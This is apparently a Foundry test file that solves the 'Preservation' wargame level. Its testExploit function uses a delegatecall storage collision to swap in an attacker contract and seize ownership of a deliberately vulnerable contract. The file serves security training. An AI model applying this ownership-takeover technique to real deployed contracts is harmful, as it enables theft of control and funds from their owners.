// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Preservation.sol";
import "../src/Delegate.sol";
import "../script/DeployScript.s.sol";

contract PreservationTest is Test {
    DeployScript public deployScript;
    Preservation public preservation;
    LibraryContract dummy1 ;
    LibraryContract dummy2 ;
    Delegate public attack;
    address player = makeAddr("player");


    function setUp() public {
        deployScript = new DeployScript();
        (attack, preservation) = deployScript.run();

    }

    function testExploit() public {
        vm.startPrank(player);

        // Step 1: Overwrite timeZone1Library with address of attacker contract
        preservation.setFirstTime(uint256(uint160(address(attack))));

        // Step 2: Now that timeZone1Library points to Delegate, call setFirstTime again
        preservation.setFirstTime(uint256(uint160(player)));

        vm.stopPrank();

        // ✅ Check that owner has changed to player
        assertEq(preservation.owner(), player);
    }
}


